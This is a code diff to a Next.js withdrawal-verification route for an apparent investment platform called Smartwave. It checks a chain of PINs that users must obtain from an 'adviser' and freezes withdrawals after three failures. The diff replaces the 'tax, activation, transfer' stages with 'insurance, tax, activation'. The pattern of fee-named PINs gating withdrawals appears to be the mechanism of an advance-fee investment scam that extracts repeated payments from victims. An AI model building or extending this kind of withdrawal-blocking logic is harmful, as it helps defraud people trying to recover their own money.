@@ -24,9 +24,9 @@ export async function POST(request: NextRequest) {
   const { data: pins } = await db.from('withdrawal_pin_credentials').select('*').eq('user_id', user.id).single()
   if (!pins || pins.withdrawal_hold_at) return NextResponse.json({ error: 'Withdrawals are on hold. Contact Smartwave support.' }, { status: 423 })
   if (pins.used_at) return NextResponse.json({ error: 'This PIN set has already been used. Ask your adviser to issue a new set.' }, { status: 403 })
-  const column = body.stage === 'tax' ? 'tax' : body.stage === 'activation' ? 'activation' : 'transfer'; const valid = matches(String(body.pin || ''), pins[`${column}_hash`])
+  const column = body.stage === 'insurance' ? 'insurance' : body.stage === 'tax' ? 'tax' : 'activation'; const valid = matches(String(body.pin || ''), pins[`${column}_hash`])
   if (!valid) { const attempts = Number(pins[`${column}_attempts`]) + 1; const update: Record<string, unknown> = { [`${column}_attempts`]: attempts, updated_at: new Date().toISOString() }; if (attempts >= 3) update.withdrawal_hold_at = new Date().toISOString(); await db.from('withdrawal_pin_credentials').update(update).eq('user_id', user.id); return NextResponse.json({ error: attempts >= 3 ? 'Three failed attempts. Withdrawals are now on hold.' : `Incorrect PIN. ${3 - attempts} attempt(s) remaining.` }, { status: attempts >= 3 ? 423 : 400 }) }
-  const next = body.stage === 'tax' ? 'activation' : body.stage === 'activation' ? 'transfer' : 'complete'; await db.from('withdrawal_verification_sessions').update({ stage: next }).eq('id', session.id)
+  const next = body.stage === 'insurance' ? 'tax' : body.stage === 'tax' ? 'activation' : 'complete'; await db.from('withdrawal_verification_sessions').update({ stage: next }).eq('id', session.id)
   if (next === 'complete') {
     const { data: account } = await db.from('investment_accounts').select('id, currency').eq('user_id', user.id).limit(1).maybeSingle()
     if (!account) return NextResponse.json({ error: 'No investment account was found for this withdrawal.' }, { status: 400 })
